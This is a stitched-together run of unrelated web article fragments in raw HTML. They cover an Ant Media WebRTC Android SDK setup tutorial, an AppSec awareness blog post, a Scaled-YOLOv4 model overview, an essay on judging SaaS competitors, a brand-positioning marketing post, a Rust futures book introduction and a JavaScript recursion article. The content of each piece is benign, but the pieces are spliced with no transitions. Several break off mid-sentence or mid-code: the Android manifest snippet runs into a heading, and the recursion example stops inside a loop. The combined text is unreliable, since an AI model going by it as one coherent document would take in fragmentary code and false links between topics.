<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/setup_new_2.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 11" title="How to Use WebRTC SDK in Native Android App? 12"><span></span></p>
<p>Click Finish and complete creating the project.</p>
<h5>Import WebRTC SDK as Module to Android Project</h5>
<p>After creating the project. Let’s import the WebRTC Android SDK to the project. For doing that click<span>&nbsp;</span><strong><code>File &gt; New &gt; Import Module</code></strong><span>&nbsp;</span>. Choose the directory of the WebRTC Android SDK and click the Finish button.<span>&nbsp;</span><img alt="Import Native WebRTC Android SDK" src="https://camo.githubusercontent.com/ee7c9c398a5c04df0ef0f8aec00e1780d18b94fa598f6d3cf20261e66aeafa2e/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323031382f30372f53637265656e2d53686f742d323031382d30372d32372d61742d30382e31312e34392e706e67" width="800px" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2018/07/Screen-Shot-2018-07-27-at-08.11.49.png" title="How to Use WebRTC SDK in Native Android App? 13"></p>
<p>If module is not included in the project, add the module name into<span>&nbsp;</span><code>settings.gradle</code><span>&nbsp;</span>file as shown in the image below.<span>&nbsp;</span><img alt="Import module in setting.gradle" src="https://camo.githubusercontent.com/30315512e927c0c9eb08443658913621936de87ba38756e629bad6d8414b2cf8/68747470733a2f2f616e746d656469612e696f2f77702d636f6e74656e742f75706c6f6164732f323031382f30372f53637265656e2d53686f742d323031382d30372d32372d61742d30382e32302e32322d332e706e67" width="800px" data-canonical-src="//i0.wp.com/antmedia.io/wp-content/uploads/2018/07/Screen-Shot-2018-07-27-at-08.20.22-3.png" title="How to Use WebRTC SDK in Native Android App? 14"></p>
<h5>Add dependency to Android Project App Module</h5>
<p>Right-click<span>&nbsp;</span><code>app</code>, choose<span>&nbsp;</span><code>Open Module Settings</code>and click the<span>&nbsp;</span><code>Dependencies</code><span>&nbsp;</span>tab. Then a window should appear as below. Click the<span>&nbsp;</span><code>+</code><span>&nbsp;</span>button at the bottom and choose `Module Dependency“</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/android_module_dependency.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 12" title="How to Use WebRTC SDK in Native Android App? 15"><span></span></p>
<p>Choose WebRTC Native Android SDK and click OK button</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/android_choose_native_sdk.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 13" title="How to Use WebRTC SDK in Native Android App? 16"><span></span></p>
<p><strong>CRITICAL thing about that</strong><span>&nbsp;</span>You need import Module as an<span>&nbsp;</span><strong>API</strong><span>&nbsp;</span>as shown in the image above.It will look like as in the image below after adding the dependency:</p>
<p><img src="https://github.com/ant-media/Ant-Media-Server/wiki/images/android_after_adding_native_sdk.png" width="720" alt="How to Use WebRTC SDK in Native Android App? 14" title="How to Use WebRTC SDK in Native Android App? 17"><span></span></p>
<h5>Prepare the App for Streaming</h5>
<ul>
<li>Create a MainActivity.java Class and add a Button to your activity main layout. This is just simple Android App development, we don’t give details here. You can get lots of tutorials about that on the Internet.</li>
<li>Add permissions in Manifest file.</li>
</ul>
<p>Open the AndroidManifest.xml and add below permissions between<span>&nbsp;</span><code>application</code><span>&nbsp;</span>and<span>&nbsp;</span><code>manifest</code>tag</p>
<div> <pre>    &lt;<span>uses-feature</span> <span>android</span><span>:</span><span>name</span>=<span><span>"</span>android.hardware.camera<span>"</span></span> /&gt;

<h5>Implement MainActivity onCreate function</h5>
<p>Open the MainActivity.java and implement it as below. You should change<span>&nbsp;</span><code>SERVER_URL</code><span>&nbsp;</span>according to your Ant Media Server address.

<li>Awareness (you are here)</li>
<li>Enablement (coming soon)</li>
<li>Enforcement (coming soon)</li>
</ul>
<p>Last week I published a post introducing three important phases of AppSec Engineering: Awareness, Enablement, and Enforcement. Over the next three posts I will dive into each of these topics to share best practices and guidelines you can roll out to optimize your security engineering practice.</p>
<p>In my experience, the best AppSec programs start with AppSec awareness training. The goal is to provide your product team with enough information to know when they need security involvement. That’s a broad statement, so let’s break it down.</p>
<p>AppSec awareness is different than security awareness. General security awareness protects the organization or enterprise by training employees in topics such as how to identify phishing attacks, how to choose good passwords, and understanding why TLS is important. Security awareness is incredibly important to any organization as most successful data breaches include a human component. AppSec awareness, however, is more targeted and it arms your engineering team members on how to identify risk, understand vulnerabilities, and to recognize when the security team should be brought in to enable good decision making (more on that in phase 2).</p>
<p>It should be stated clearly that the goal of this program is not to turn every person in your organization into a security expert. It is to give them the tools they need to know when they are about to take an action that may impact business risk and to “raise their hand” for support and guidance.</p>
<blockquote>
<p>The goal of this program is <em>not</em> to turn every person at your organization into a security expert</p>
</blockquote>
<p>The goals during the awareness phase are to know:</p>
<ul>
<li>What needs to be protected</li>
<li>What are sensitive components</li>
<li>What is risk</li>
<li>Security can be interesting and fun</li>
<li>Security doesn’t have to be time consuming</li>
<li>The security team isn’t here just to say no</li>
</ul>
<p>Let’s break down each of the goals individually.</p>
<h2 id="what-needs-to-be-protected">What needs to be protected</h2>
<p>One of the first things I train a product team to do is to understand what assets are most important to protect. This can be Intellectual Property, regulated data (PII, PCI, HIPAA, etc.) , or what is most likely to be targeted by attackers. The ability to identify assets is a massive first step to understanding security, risk, and remediation.</p>
<h2 id="what-are-sensitive-components">What are sensitive components</h2>
<p>Components that handle sensitive data are inherently risky, but there are other components that can be difficult to build safely as well. Some components may give an attacker an advantage in the system, run as privileged accounts, or give access to other privileged data or components; these components should also be identified as risky as well.</p>
<h2 id="what-is-risk">What is risk</h2>
<p>Being able to have a meaningful conversation about risk is another key goal in the Awareness phase of AppSec Engineering. There are many ways to measure risk, many of them a complicated nesting doll of security jargon. However, I’ve found that most people inherently understand risk at a sufficient level for this awareness phase. AppSec professionals and leaders must understand risk deeply.</p>
<p><img src="https://rethinksecurity.io/post-images/risk.png" alt="Risk = Likelihood * Impact"></p>
<p>Defining risk as likelihood multiplied by impact is clear and understandable.</p>
<h2 id="security-can-be-interesting-and-fun">Security can be interesting and fun</h2>
<p>The best part of my job is watching the security “light-bulb” go off in people’s heads. Sometimes it’s when they understand how hackers think or sometimes it’s when they understand a specific threat or attack vector. No matter the precipitating event the discovery that security is fun and engaging is a key component of awareness. Making security fun will help the product security team return to security again and again and want to learn more about it organically.</p>
<h2 id="security-doesnt-have-to-be-time-consuming">Security doesn’t have to be time consuming</h2>
<p>When I started out in security, about 20 years ago, the focus was on “Security Gates” or checkpoints that the application would have to go through like a gauntlet of pain before deploying the product: Have you created a threat model? Did you do an architecture review? Have you performed the necessary code reviews, or code scans? Has the security team tested your system? Is there a review of the infrastructure impact and so many more things. Looking back it’s no wonder developers were cautious about security teams.</p>
<p>The current era of security focuses entirely on enablement&nbsp;The ProdSec team should be building libraries and tools that make development faster and easier for teams to build and deploy secure software. We will dive into the specifics of security enablement in the next article, but the key takeaway at this time is that the product team should understand working with security will not slow them down.</p>
<h2 id="the-security-team-isnt-here-just-to-say-no">The security team isn’t here just to say no</h2>
<p>Developers often think of the security team as unnecessarily obstructionist. With the security gates mentality this can absolutely be true. In fact security teams often get named “The office of no” and sometimes for good reason.</p>
<p>Many good security teams have evolved their thinking to enable development of great new features that are secure from current and future threats. Building software this way not only enables the development team to build software quickly and securely but also develops relationships between the teams and allows security to become a market differentiator for the product as a whole.</p>
<h2 id="what-is-the-security-implication-of-this">What is the security implication of this?</h2>
<p>If most of your Product Team is asking the question “What is the security implication of this?” during meetings, scrums, or feature discussions and that question spurs an engaging and lively discussion, then the goal of awareness has been achieved. The goal of this phase is to arm your team with the questions, passion, and curiosity to start these conversations, not necessarily to finish them.</p>

The EfficientDet authors use search to find an optimal scaling threshold from EfficientDet-D0 to EfficientDet-D1, and use this setting to linearly scale up to the famed EfficientDet-D7.</p><h3 id="yolo-models">YOLO Models</h3><p>The YOLO family of models, written in the Darknet framework, has a <a href="https://blog.roboflow.com/a-thorough-breakdown-of-yolov4/">rich history</a> starting with Joseph Redmon (Github moniker <a href="https://pjreddie.com/">pjreddie</a>). Recently, the YOLO name and architecture have been picked up recently by a number of computer vision researchers.</p><p><strong>YOLOv4 - </strong>Early this spring, <a href="https://github.com/AlexeyAB">AlexyAB</a> formalized his fork of the Darknet repo, publishing the state-of-the-art <a href="https://blog.roboflow.com/a-thorough-breakdown-of-yolov4/">YOLOv4 model</a>. YOLOv4 was considered one of the best models for speed and accuracy performance, but did not top EfficientDet's largest model for overall accuracy on the COCO dataset.</p><p><strong>YOLOv5 - </strong>Shortly after the release of YOLOv4, Glenn Jocher (Github moniker <a href="https://github.com/glenn-jocher">glenn-jocher</a>) published his version of the YOLO model in PyTorch as <a href="https://blog.roboflow.com/yolov5-improvements-and-evaluation/">YOLOv5</a>. Comparing how YOLOv4 and YOLOv5 models stacked up against each other was nuanced – we wrote a bunch on the <a href="https://blog.roboflow.com/yolov4-versus-yolov5/"></a><a href="https://blog.roboflow.com/yolov4-versus-yolov5/">YOLOv4 vs</a>.<a href="https://blog.roboflow.com/yolov4-versus-yolov5/"> YOLOv5 </a>debate here.</p><p>The YOLOv5 PyTorch training and architecture conversion was the most notable contribution, making YOLO easier than ever to train, <em>speeding up training time 10x relative to Darknet</em>. </p><p>One of the main reasons Scaled-YOLOv4 is implemented in the YOLOv5 PyTorch framework is, no doubt, the training routines. Glenn Jocher notably gets a shoutout in the Acknowledgments of Scaled-YOLOv4.</p><p><strong>PP-YOLO - </strong>This summer, researchers at <a href="https://www.baidu.com/">Baidu</a> released their version of the YOLO architecture, <a href="https://blog.roboflow.com/pp-yolo-beats-yolov4-object-detection/">PP-YOLO, surpassing YOLOv4 and YOLOv5</a>. The network, written in <a href="https://www.paddlepaddle.org.cn/">the Paddle-Paddle framework</a>, performed well but has yet to gain much traction among practitioners.</p><p><strong>But all of that's old news:</strong> Scaled-YOLOv4 is here and YOLOv4 has been fully <a href="https://arxiv.org/pdf/1911.11929.pdf">CSP-ized</a>!</p><h2 id="scaled-yolov4-techniques">Scaled-YOLOv4 Techniques</h2><p>To scale the YOLOv4 model, the Scaled-YOLOv4 authors explore the following strategies.</p><figure><img src="https://blog.roboflow.com/content/images/2020/12/image-3.png" alt="" srcset="https://blog.roboflow.com/content/images/size/w600/2020/12/image-3.png 600w, https://blog.roboflow.com/content/images/size/w1000/2020/12/image-3.png 1000w, https://blog.roboflow.com/content/images/2020/12/image-3.png 1376w" sizes="(min-width: 720px) 720px"><figcaption>A visualization of the YOLO network, courtesy of <a href="https://arxiv.org/pdf/2007.12099.pdf">PP-YOLO</a>.

They consider a few CSP-ized CNN backbones in their network, ResNet, ResNeXt, and the traditional Darknet backbone.</p><h3 id="csp-izing">"CSP-izing"</h3><p>In the <a href="https://arxiv.org/abs/2011.08036">Scaled-YOLOv4</a> paper the authors often write that they "CSP-ized" a given portion of the network.

When we compare YOLOv4-CSP with the same accuracy of EfficientDetD3 (47.5% vs 47.5%), the inference speed is 1.9 times [that of EfficientDetD3]. When YOLOv4-P5 is compared with EfficientDet-D5 with the same accuracy (51.4% vs 51.5%), the inference speed is 2.9 times [that of EfficientDet-D5]. The situation is similar to the comparisons between YOLOv4-P6 vs EfficientDet-D7 (54.3% vs 53.7%) and YOLOv4-P7 vs EfficientDet-D7x (55.4% vs 55.1%).

December 3, 2020 | https://staysaasy.com/product/2020/12/01/which-competitors-matter.html | <a href="https://web.archive.org/web/*/https://staysaasy.com/product/2020/12/01/which-competitors-matter.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Enterprise SaaS is brutally competitive. Markets are crowded and zero sum: customers are buying your product, a competing product, or nothing. The industry naturally leads teams to obsess about competitors.</p>

<p>If you spend your entire day thinking about the competition, you’ll fail. The best companies succeed by building what their customers need, rather than analyzing their competitors’ actions. To stay focused (and stay sane), you need to relentlessly prioritize and only devote your team’s finite energy to your most significant rivals.</p>

<p>It’s a bit like running a football team. If you spend your entire time studying your opponents, you’ll lose because you didn’t practice your plays, work out, or prepare to play your game. But if you ignore your opponents and focus 100% inwardly, you’ll both miss out on opportunities to beat them and also risk having your weaknesses exploited. And unlike in football, you may have dozens or hundreds of opposing teams, and you don’t even know who your next opponent might be.</p>

<p>Inevitably, you need to decide which competitors deserve your attention. Taking the right steps to ward off serious competitors pays dividends when done early. Beat an established company enough and you can dissuade them from entering your market. Kill your startup competitors in the crib, and they’ll pivot or be unable to raise funds to survive.</p>

<p>Below is a quick-and-dirty set of criteria to determine how much mind to pay your competitors, in order from least worrisome to most.</p>

<h2 id="you-run-into-a-competitor-in-new-head-to-head-deals-but-you-always-win">You run into a competitor in new head-to-head deals, but you always win</h2>

<p><em>We’ve seen a new competitor, SnowDog, in 3 deals already. But don’t worry, we’ve beaten them every time. Their product is just not able to compete with ours at this point.</em></p>

<p>Running into a competitor in head-to-head deals is the first indication that they’re coming for your market. It means that their sales and marketing can access the same customers as you, and that their product positioning attracts the same buyers.</p>

<p>At this stage, if you’re consistently beating a competitor, one of two things can happen. In some cases, they’ll give up – pivoting or abandoning their product, or steering away from you in the market. But in others, this stage is just the precursor and they’ll persist in their efforts to compete. This is the first warning sign but is usually not worth reacting to.</p>

<h2 id="the-competitor-beats-you-but-for-bad-reasons">The competitor beats you, but for bad reasons</h2>

<p><em>We ran into SnowDog in 8 deal cycles last quarter, and they beat us in 3 of them. But it wasn’t for good reasons – they dropped their prices to just 20-30% of ours, added in tons of consulting services, and in one case even promised to build a one-off feature that the customer wanted.</em></p>

<p>When a competitor is desperate, they’ll pull all sorts of tricks in order to beat you. This is especially common when competing against early stage startups. They may win deals, but they’ll ultimately win because of “bad” reasons:</p>

<ul>
  <li>Dramatically undercutting you on price</li>
  <li>Offering to do tons of custom work</li>
  <li>Customizing their roadmap to close deals</li>
  <li>Simply being dishonest in the sales cycle</li>
</ul>

<p>Losing to a competitor for bad reasons tells you that they simply aren’t yet ready to compete with you on a fair playing field. But it also confirms that they are planning to compete with you, and that you’ll need to deal with them in the future… if their business-weakening competitive tactics allow them to survive that long.</p>

<h2 id="the-competitor-beats-you-but-for-valid-reasons">The competitor beats you, but for valid reasons</h2>

<p><em>Hmm… We’ve continued to run into SnowDog, and they just beat us in the Jetblue deal even after we had dropped our prices to remain competitive. The buyer at Jetblue said that they just liked SnowDog’s offering more for their team’s particular use-cases.</em></p>

<p>There can be any number of reasons why a competitor beats you fair and square. They may have outsold you; they may have gotten to the customer first. They may have a better product overall, or may just have a better product for a niche situation that some customers care about.</p>

<p>When you lose for a “valid” reason, it indicates that your competitor’s pitch and ability to back that pitch up in a sales cycle are real. Their product might not actually be that great, but overall they have figured out the mix of product and positioning that gives them a foundation from which to build their go-to-market motion.</p>

<p>Most SaaS markets are competitive, so you should expect to lose some head-to-head deals for valid reasons from time to time. You certainly shouldn’t panic at this point, but by now you should be actively monitoring the competitor in question and preparing your sales team to combat them.</p>

<h2 id="you-cant-reliably-rip-the-competitor-out">You can’t reliably rip the competitor out</h2>

<p><em>SnowDog has been working with Southwest Airlines for a year and a half already. We tried to get them to switch to our offering, but we haven’t been able to do so yet – even though they aren’t huge SnowDog advocates, Southwest says that they’re satisfied enough with the offering and focusing on other projects in the coming year.</em></p>

<p>This is the first severe warning flag. If you can’t rip out a competitor – that is, you can’t pull them out once they’re installed – that means that their product is truly adding value in a sustainable way. Products with weak product/market fit aren’t sticky, and you’ll be able to rip them out easily. Products with strong product/market fit, even if expensive or not beloved, are surprisingly durable once customers are using them.</p>

<p>When you can’t reliably rip a competitor out, you’re dealing with a true adversary and beating them should factor into your company’s strategic roadmap.</p>

<h2 id="the-competitor-can-reliably-rip-you-out-but-only-in-a-niche-customer-segment">The competitor can reliably rip you out, but only in a niche customer segment</h2>

<p><em>It’s a bummer that American Airlines stopped working with us, and we just found out that they actually switched to use SnowDog. This is bad news but isn’t too surprising, however – SnowDog have really established that they’re strong in the airline industry. They don’t have a lot of ability to expand beyond that vertical… we think?</em></p>

<p>This is the most important stage, as it involves a fork in the road.</p>

<p>At this stage there is almost certainly trouble, but the question is how much? Perhaps a competitor is taking only your largest enterprise customers away, or your customers in one particular industry vertical. The company-shaping decision you must make at this point is whether you think that this is as far as they can go, or if they will come after you in another category next.</p>

<p>If you feel that a competitor won’t be able to attack your core business, you <em>may</em> not need to react. Perhaps your product was never really meant for the airline vertical (or wherever you’re losing customers) and this just speeds up your exit from the space. You must monitor the situation but it doesn’t yet need to dominate your field of view.</p>

<p>But it’s also possible that this is just step 1 of a comprehensive attack. Beating you in one customer segment is always the prelude to beating you across the entire market. If there is even a possibility that the competitor will have the incentive and ability to attack your core market, beware: beating this competitor should now be a key pillar of your roadmap, and it’s easiest to take steps to block them immediately.</p>

<p>One indicator that can help make this decision is actually the competitor’s own product marketing. Many companies will actually publicly declare the markets that they want to enter. It’s good PR for prospective future investors, whether public or private. Another clue can come from fundraising patterns - all else being equal, the more money a company has raised, the more markets they will feel compelled to enter in order to justify a higher valuation.</p>

<h2 id="the-competitor-can-reliably-rip-you-out-of-most-customers">The competitor can reliably rip you out of most customers</h2>

<p><em>Home Depot just churned to use SnowDog. What the f### is going on?</em></p>

<p>This is code red, drop everything. This competitor presents an existential risk to your business that you must deal with immediately if you want to keep your job. The longer you wait the worse the problem will become. Beating this competitor is now the core of your roadmap.</p>

<p>The trick is to never, ever get to this point – or at least, if you do get to this point, to see it coming early enough that you have a plan. You can do this by looking for the indicators above, and gradually increasing your defensive and offensive capabilities and counter-capabilities against top competitors to prevent them from rising up in the first place. The full story of how to combat competitors will be the topic of future posts!</p>

<h2 id="takeaways">Takeaways</h2>

<p>Prioritize the amount of time that you spend on the competition. When a competitor rears its head, consider where they fall on this spectrum to determine how concerned you should be. It’s easier to beat competitors when they’re small or before they get to your market, saving you months of work and heartache in the long run.</p>

All in all, the total percentage of Steam users with a VR headset all all rose to 1.91%.</p><p>Last month, 1 in 6 headsets were Oculus Quests - for the first time more than the Valve Index.

<p>This book aims to explain Futures in Rust using an example driven approach,
exploring why they're designed the way they are, and how they work. We'll also
take a look at some of the alternatives we have when dealing with concurrency
in programming.</p>
<p>Going into the level of detail I do in this book is not needed to use futures
or async/await in Rust. It's for the curious out there that want to know <em>how</em>
it all works.</p>
<h2><a href="#what-this-book-covers" id="what-this-book-covers">What this book covers</a></h2>
<p>This book will try to explain everything you might wonder about up until the
topic of different types of executors and runtimes. We'll just implement a very
simple runtime in this book introducing some concepts but it's enough to get
started.</p>
<p><a href="https://github.com/stjepang">Stjepan Glavina</a> has made an excellent series of
articles about async runtimes and executors, and if the rumors are right there
is more to come from him in the near future.</p>
<p>The way you should go about it is to read this book first, then continue
reading the <a href="https://stjepang.github.io/">articles from stejpang</a> to learn more
about runtimes and how they work, especially:</p>
<ol>
<li><a href="https://stjepang.github.io/2020/01/25/build-your-own-block-on.html">Build your own block_on()</a></li>
<li><a href="https://stjepang.github.io/2020/01/31/build-your-own-executor.html">Build your own executor</a></li>
</ol>
<p>I've limited myself to a 200 line main example (hence the title) to limit the
scope and introduce an example that can easily be explored further.</p>
<p>However, there is a lot to digest and it's not what I would call easy, but we'll
take everything step by step so get a cup of tea and relax.</p>
<p>I hope you enjoy the ride.</p>

The Business Dictionary defines brand positioning as:</p><blockquote><p>“A marketing strategy that aims to make a brand occupy a distinct position, relative to competing brands, in the mind of the customer.</p></blockquote><blockquote><p>Companies apply this strategy either by emphasizing the distinguishing features of their brand or they may try to create a suitable image (inexpensive or premium, utilitarian or luxurious, entry-level or high-end, etc.)”</p></blockquote><p>If there is a significant gap between marketing strategy and your brand positioning, then that gap is eating up sales and revenue. As this gap becomes smaller, your sales will increase further — its that simple!</p><p>For some context, I’ve worked in marketing for nearly 10 years, with a couple of years in Head of Marketing and CMO roles before starting <a href="https://rhealondon.com/">Rhea London</a> to help brands and businesses reach their goals.</p><p>One thing we pride ourselves on at the agency is generating maximum revenue for our clients in a short time frame. We’ve had good success with this for the first year we were operating, but sales for our clients increased&nbsp;<em>dramatically</em>when we stopped thinking like marketers, and starting thinking like brand managers.</p><p>Branding pioneer, Marty Neumeier (lived in Sillicon Valley since the 80’s and has designed for&nbsp;<em>Adobe, Apple, Hewlett-Packard&nbsp;</em>and&nbsp;<em>Microsoft</em>) emphasises the need to pay attention to the order in which your customer will view your sales proposition (in our case, a Facebook ad). He’s spent decades refining his thinking on this, with the biggest brands in the world.</p><p>When a potential customer sees your ad, there is a moment when their eyes are looking right at you— this is your one and&nbsp;<em>only</em>&nbsp;time to shine. Neumeier calls this small window of opportunity ‘<em>the branding moment’.</em></p><p>Neumeier lays out 5 stages of how a customer views a product on a supermarket shelf, with each stage often being entirely subconscious.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1607079818241_8798"><div><p>There are very few people reading this that will ever need to sell a product on a shelf, but this framework is<em>&nbsp;directly relatable&nbsp;</em>to advertising on social media (I’ll go in to why in a moment). First, the 5 stages:</p><ol data-rte-list="default"><li><p><strong>Shopper notices packaging on shelf — notices strong colours, contrasting tones.</strong></p></li><li><p><strong>Shopper asks ‘what is it?’</strong></p></li><li><p><strong>Asks ‘why should I care’</strong></p></li><li><p><strong>Looks for more information</strong></p></li><li><p><strong>Shopper has decided if they are ready (or not) to consider price and features.</strong></p></li></ol><p>When translated to seeing your ad on Facebook/Instagram this translates to:</p><ol data-rte-list="default"><li><p><strong>Your target customer stops scrolling when they see your ad — strong colours, contrasting tones grab attention.</strong></p></li><li><p><strong>Target customer asks ‘what is it?’ — your tagline (or headline) should answer this for them.</strong></p></li><li><p><strong>Asks ‘why should I care?’ — this is where you can touch on their pain points and differentiate your product from your competition.</strong></p></li><li><p><strong>This creates the desire for more info — you need to creatively peak their interest and pull them in with a clear why-to-buy message.</strong></p></li><li><p><strong>They are now ready (and primed) to see your features, prices, guarantees, awards and whatever else will take them over the line.</strong></p></li></ol><p>Putting this into practice may seem straight forward, and you may be reading this thinking ‘but, I already do that’ — well if you take a look at one of your ads right now, with those 5 stages in mind, you’ll likely see a significant gap between points. And what’s important to remember is, if&nbsp;<em>any</em>&nbsp;of those points are weak, your brand positioning is weak — resulting in a breakdown in communication between your ad and your potential customer.</p><p>Okay, so how exactly did we use this methodology to generate <strong>over $100,000 in sales?</strong></p><p>The first step was to turn off all ads and start again.</p><p>We redesigned&nbsp;<em>everything</em>.</p><p>New copy, defined new USPs, new tone of voice, new images.</p><p>But for us, what was most important was to first understand what differentiated the products that we were selling, from their direct competitors so that we could effectively communicate this when considering point number 3 above.</p><p>There is one question that has been asked by designers and their marketing counterparts since the dawn of advertising; ‘what drives the customer to buy — logic or emotion?’.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><h2>It's about time we reframed the education of recursion around real life scenarios instead of elegant mathematical equations</h2><div><p>Algorithms</p><p>Comp Sci</p><p>JavaScript</p></div><em>December 3rd, 2020</em><article><p><img src="https://sunilsandhu.com/assets/post-content/reframing-recursion.png" alt="Two circles recursively regenerating inside of themselves"></p>
<p>For programmers - especially self-taught programmers - our first introduction to the world of
'recursion' is often in the form of something math-related. It's not uncommon for programmers to
intrinsically call upon some of our favourite F words when we think of recursion - no not that F
word, these ones:</p>
<p><strong>Fibonacci</strong></p>
<pre><code><span><span>function</span> <span>fibonacci</span>(<span>position</span>) </span>{
  <span>if</span> (position &lt; <span>3</span>) <span>return</span> <span>1</span>;
  <span>return</span> fibonacci(position - <span>1</span>) + fibonacci(position - <span>2</span>);
}</code></pre>
<p><strong>Factorial</strong></p>
<pre><code><span><span>function</span> <span>factorial</span>(<span>num</span>) </span>{
  <span>if</span> (num === <span>1</span>) <span>return</span> num;
  <span>return</span> num * factorial(num - <span>1</span>);
}</code></pre>
<p>Recursive versions of the fibonacci and factorial functions are some of the more beautiful pieces of
code you can expect to see. These concise slices of code rely on little more than themselves to get
the job done. They embody the very definition of recursion - a function that calls itself (the
calling of itself is the part that is recursive). It's really no wonder that just like when a
tutorial incorporates a new topic by demonstrating how it interacts with something trivial, like a
counter or a 'to do' list, fibonacci and factorial functions encapsulate the topic of recursion with
little to zero interference from the external complexities you might find as soon as you start
introducing other bits of code to interact with. Just like the counter and the 'to do' list,
fibonacci and factorial are trivial.</p>
<p>You may have heard a saying that "all iterative algorithms can be expressed recursively". In other
words, a function that uses a loop can be rewritten to use itself. Now if any iterative algorithm
can be written recursively, the same must be true for the inverse.</p>
<p><em>Note: An iterative algorithm, or function, is one that makes use of a loop to get the job done.</em></p>
<p>Let's go back to our recursive Fibonacci function and write it as an iterative Fibonacci function
instead:</p>
<pre><code><span><span>function</span> <span>fibonacci</span>(<span>index = <span>1</span></span>) </span>{
  <span>let</span> sequence = [<span>0</span>, <span>1</span>, <span>1</span>];
  <span>if</span> (index &lt; <span>3</span>) <span>return</span> <span>1</span>;
  <span>for</span> (<span>let</span> i = <span>2</span>; i &lt; index; i++) {
    sequence.push(sequence[sequence.length - <span>1</span>] + sequence[sequence.length - <span>2</span>]);
  }
  <span>return</span> sequence[index];
}</code></pre>
<p>Let's also take our recursive Factorial function and write that as an iterative Factorial function:</p>
<pre><code><span><span>function</span> <span>factorial</span>(<span>num</span>) </span>{
  <span>if</span> (num === <span>1</span>) <span>return</span> <span>1</span>;

  <span>for</span> (<span>let</span> i = num - <span>1</span>; i &gt;= <span>1</span>; i--) {
    num = num * i;
  }
  <span>return</span> num;
}</code></pre>
<p>Both of our recursive and iterative approaches reach the same conclusion. If you give them the same
input, they will produce the same output. Even the path the take is, arguably, the same. The only
difference is the metaphorical mode of transportation used on the path to reach said output.</p>
<p>So if we're able to write recursive functions iteratively, why do we even need to bother learning
about recursion in the first place, and what use does it have in programming?</p>
<p>The main reason we use recursion is to simplify an algorithm into terms easily understood by most
people. It's important to note here that the purpose of recursion (or rather, its benefit of
recursion) is to make our code easier to read, and easier to reason with. However, it is important
to be aware that recursion is not a mechanism we can use to optimize our code for performance - if
anything, it can have an adverse effect on performance compared to an equivalent function written
iteratively.</p>
<p>If you want a short soundbite to remember, I'd say this: <em>Recursive functions optimise legibility
for developers. Iterative functions optimise performance for computers.</em></p>
<p>The frustrating thing about a lot of articles and tutorials on recursion I've read before is that
they veer on the side of caution and fixate themselves on only talking about functions such as a
recursive fibonacci or factorial. There's no real advantage a developer can gain from these being
written recursively. This is like giving someone the punchline to a joke, without any of the steps
leading up to it.</p>
<p>In the case of recursive fibonacci and factorial functions, we saw earlier that if we convert them
into iterative functions the code itself isn't actually that bad. It's arguably just as easy to read
and legible as the recursive equivalents. Sure, it might not have the same level of elegance, but if
it's still readable, I'm going to go ahead and favour optimising for perfornance.</p>
<p>It therefore seems plausible that a lot of people learning about recursion for the first time may
struggle to see any real use from using it. Maybe they just see it as some sort of overengineering
abstraction. So how is recursion useful? Or better yet, how can we make the study of recursion
useful?</p>
<p>Useful recursion can be found when we actually try to write code that resembles a real life
scenario.</p>
<p>I can probably take a punt and say that close to zero developers anywhere (outside of a whiteboard
interview) have been expected to write a recursive fibonacci or factorial function for their job -
and if they were, they could have just googled it because there's a million articles that already
explain it.</p>
<p>There aren't, however, enough articles demonstrating how recursion can be used in real life
scenarios. We need fewer 'Introduction to Recursion' articles, and more articles about how recursion
can help you solve that coding problem you're currently facing at work.</p>
<p>So now that we're on the topic, let's imagine the following scenario: your boss has given you a data
structure full of departments that each contain the email addresses of everyone that works in that
department. However, each department sometimes is made up varying levels of subdepartments, objects
and arrays. Your boss wants you to write a function that can send an email to each of those email
addresses.</p>
<p>Here's the data structure:</p>
<pre><code><span>const</span> companyEmailAddresses = {
  <span>finance</span>: [<span>"jill@companyx.com"</span>, <span>"frank@companyx.com"</span>],
  <span>engineering</span>: {
    <span>qa</span>: [<span>"ahmed@companyx.com"</span>, <span>"taylor@companyx.com"</span>],
    <span>development</span>: [<span>"cletus@companyx.com"</span>, <span>"bojangles@companyx.com"</span>, <span>"bibi@companyx.com"</span>],
  },
  <span>management</span>: {
    <span>directors</span>: [<span>"tanya@companyx.com"</span>, <span>"odell@companyx.com"</span>, <span>"amin@companyx.com"</span>],
    <span>projectLeaders</span>: [
      <span>"bobby@companyx.com"</span>,
      <span>"jack@companyx.com"</span>,
      <span>"harry@companyx.com"</span>,
      <span>"oscar@companyx.com"</span>,
    ],
    <span>hr</span>: [<span>"mo@companyx.com"</span>, <span>"jag@companyx.com"</span>, <span>"ilaria@companyx.com"</span>],
  },
  <span>sales</span>: {
    <span>business</span>: {
      <span>senior</span>: [<span>"larry@companyx.com"</span>, <span>"sally@companyx.com"</span>],
    },
    <span>client</span>: {
      <span>senior</span>: [<span>"jola@companyx.com"</span>, <span>"amit@companyx.com"</span>],
      <span>exec</span>: [<span>"asha@companyx.com"</span>, <span>"megan@companyx.com"</span>],
    },
  },
};</code></pre>
<p>So, how do you tackle this?</p>
<p>Well, from what we can see, a subdepartment appears to take the form of an object, while arrays have
been used to store email addresses. So I could try and write some sort of iterative function that
loops through each department, and checks if it is a subdepartment (object) or a list of email
addresses (array). If it's an array, we can then loop through the array and send an email to each
email address. If it's an object, we could create another loop to tackle that subdepartment, using
the same 'check if it's an object or an array' tactic we used earlier. From what we can tell, our
data structure doesn't go any deeper than two sub levels. So one more iteration should satisfy all
levels and do what we want it to.</p>
<p>Our final code might look something like this:</p>
<pre><code><span><span>function</span> <span>sendEmail</span>(<span>emailAddress</span>) </span>{
  <span>console</span>.log(<span>`sending email to <span>${emailAddress}</span>`</span>);
}

<span><span>function</span> <span>gatherEmailAddresses</span>(<span>departments</span>) </span>{
  <span>let</span> departmentKeys = <span>Object</span>.keys(departments);
  <span>for</span> (<span>let</span> i = <span>0</span>; i &lt; departmentKeys.length; i++) {
    <span>if</span> (<span>Array</span>.isArray(departments[departmentKeys[i]])) {
